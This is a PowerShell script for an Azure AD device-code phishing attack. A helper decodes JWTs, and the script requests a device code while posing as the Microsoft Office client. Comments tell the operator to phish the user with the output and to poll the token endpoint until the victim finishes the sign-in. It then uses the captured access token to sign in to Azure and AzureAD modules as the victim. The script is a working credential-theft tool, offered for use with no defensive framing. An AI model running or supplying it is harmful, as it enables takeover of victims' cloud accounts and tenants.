function Convert-JWTtoken {
 
    [cmdletbinding()]
    param([Parameter(Mandatory = $true)][string]$token)
 
    #Validate as per https://tools.ietf.org/html/rfc7519
    #Access and ID tokens are fine, Refresh tokens will not work
    if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid token" -ErrorAction Stop }
 
    #Header
    $tokenheader = $token.Split(".")[0].Replace('-', '+').Replace('_', '/')
    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenheader.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenheader += "=" }
    Write-Verbose "Base64 encoded (padded) header:"
    Write-Verbose $tokenheader
    #Convert from Base64 encoded string to PSObject all at once
    Write-Verbose "Decoded header:"
    [System.Text.Encoding]::ASCII.GetString([system.convert]::FromBase64String($tokenheader)) | ConvertFrom-Json | fl | Out-Default
 
    #Payload
    $tokenPayload = $token.Split(".")[1].Replace('-', '+').Replace('_', '/')
    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
    Write-Verbose "Base64 encoded (padded) payoad:"
    Write-Verbose $tokenPayload
    #Convert to Byte array
    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
    #Convert to string array
    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
    Write-Verbose "Decoded array in JSON format:"
    Write-Verbose $tokenArray
    #Convert from JSON to PSObject
    $tokenobject = $tokenArray | ConvertFrom-Json
    Write-Verbose "Decoded Payload:"
    
    return $tokenobject
}

#Create body to start device-code flow and generate Device Code.
$body = @{
    "client_id" = "ee272b19-4411-433f-8f28-5c13cb6fd407" #use Microsoft Office as client app/service principal, this is visible to the end user during the flow
    #$Client_id = '1950a258-227b-4e31-a9cf-717495945fc2' #use Micrsooft Azure PowerShell as client app/service principal, this is visible to the end user during the flow
    #"resource" = "https://graph.windows.net" #Use Azure Graph as resource/backend API target
    "resource"  = "https://management.azure.com/" #Use Azure Resource Manager as resource/backend API target, Access tokens for this API can also be used for Graph..
}

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$authResponse

#use the output from authResponse to phish the user.

#Post the following body to the posturi untill you receive your access token (after the victim completes the flow) 
$body = @{
    "client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c" #Microsoft Office
    #$ClientId = '1950a258-227b-4e31-a9cf-717495945fc2' #Micrsooft Azure PowerShell
    #"resource" =  "https://graph.windows.net"
    "resource"   = "https://management.azure.com/"
    "code"       = ($authResponse.device_code)
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
}
$posturi = "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0"
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $posturi -Body $body

#You could now use response.access_token for direct access to the API, below shows how to use it with your favorite 
#Powershell modules. The ARM Access token will work on both APIs. 
$jwt = Convert-JWTtoken ($response.access_token) 
Connect-azaccount -accesstoken ($response.access_token) -accountid ($jwt.oid)
Connect-AzureAD -AadAccessToken ($response.access_token) -AccountId ($jwt.oid) -TenantId ($jwt.tid)